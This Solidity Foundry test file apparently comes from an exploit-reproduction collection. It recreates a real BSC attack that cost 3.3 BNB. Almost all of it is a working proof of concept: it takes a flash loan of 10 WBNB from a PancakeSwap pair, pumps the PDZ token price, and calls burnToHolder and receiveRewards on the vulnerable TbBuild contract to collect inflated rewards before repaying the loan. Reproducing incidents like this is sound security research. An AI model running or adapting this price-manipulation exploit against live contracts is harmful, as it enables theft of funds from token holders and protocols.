// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 3.3 BNB
// Attacker : https://bscscan.com/address/0x48234fb95d4d3e5a09f3ec4dd57f68281b78c825
// Attack Contract : https://bscscan.com/address/0x1dffe35fb021f124f04d1a654236e0879fa0cb81
// Vulnerable Contract : https://bscscan.com/address/0x664201579057f50D23820d20558f4b61bd80BDda
// Attack Tx : https://bscscan.com/tx/0x81fd00eab3434eac93bfdf919400ae5ca280acd891f95f47691bbe3cbf6f05a5

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x664201579057f50D23820d20558f4b61bd80BDda#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/tikkalaresearch/status/1957500585965678828
// Hacking God : N/A
pragma solidity ^0.8.0;

address constant PANCAKE_PAIR = 0x231d9e7181E8479A8B40930961e93E7ed798542C;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant WBNB_ADDR = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant PDZ_TOKEN = 0x50F2B2a555e5Fa9E1bb221433DbA2331E8664A69;
address constant TB_BUILD = 0x664201579057f50D23820d20558f4b61bd80BDda;


contract PDZ is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 57744491 - 1;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(0);
    }

    function testExploit() public balanceLog {
        // Step 1: borrow 10 WBNB
        IPancakePair(PANCAKE_PAIR).swap(10 ether, 0, address(this), hex"00");
    }

    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes memory _data) public {
        IERC20 wbnb = IERC20(WBNB_ADDR);
        IERC20 pdz = IERC20(PDZ_TOKEN);
        IPancakeRouter router = IPancakeRouter(payable(PANCAKE_ROUTER));

        wbnb.approve(address(router), type(uint256).max);
        address[] memory WBNB_2_PDZ = new address[](2);
        WBNB_2_PDZ[0] = WBNB_ADDR;
        WBNB_2_PDZ[1] = PDZ_TOKEN;

        // Step 2: 10 WBNB -> PDZ
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(10 ether, 0, WBNB_2_PDZ, address(this), block.timestamp);

        address[] memory PDZ_2_WBNB = new address[](2);
        PDZ_2_WBNB[0] = PDZ_TOKEN;
        PDZ_2_WBNB[1] = WBNB_ADDR;

        uint256 amount = 5467668273;
        ITbBuild tbBuild = ITbBuild(TB_BUILD);
        // Step 3: burn PDZ burn for BNB reward
        // The `burnToHolder` function calculates rewards using uniswapRouter.getAmountsOut,
        // which makes deserved instantly manipulable by pool price manipulation.
        tbBuild.burnToHolder(amount, address(0));
        tbBuild.receiveRewards(address(this));

        uint256 pdzBal = pdz.balanceOf(address(this));
        pdz.approve(PANCAKE_ROUTER, type(uint256).max);
        // Step 4: PDZ -> WBNB
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(pdzBal, 0, PDZ_2_WBNB, address(this), block.timestamp);

        // Step 5: pay flash loan fee
        uint256 paybackAmount = 10.25 ether + 1;
        WBNB(WBNB_ADDR).deposit{value: paybackAmount}();
        wbnb.transfer(PANCAKE_PAIR, paybackAmount);
    }

    receive() external payable {}
}

interface ITbBuild {
    function burnToHolder(uint256 amount, address _invitation) external;
    function receiveRewards(address to) external;
}